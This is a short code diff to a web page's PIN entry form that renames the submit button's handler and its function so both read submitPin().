@@ -132,7 +132,7 @@
 <input type="password" maxlength="1" class="pin-box" id="pin3">
 <input type="password" maxlength="1" class="pin-box" id="pin4">
     </div>
-<button onclick="submitOtp()" class="login-btn">Submit</button>
+<button onclick="submitPin()" class="login-btn">Submit</button>
 </div>
 
 <!-- BOTTOM BLUE -->
@@ -150,7 +150,7 @@
 <script src="script.js"></script>
 
 <script>
-function submitpin() {
+function submitPin() {
     let pin = "";
 
     document.querySelectorAll(".pin-box").forEach(input => {
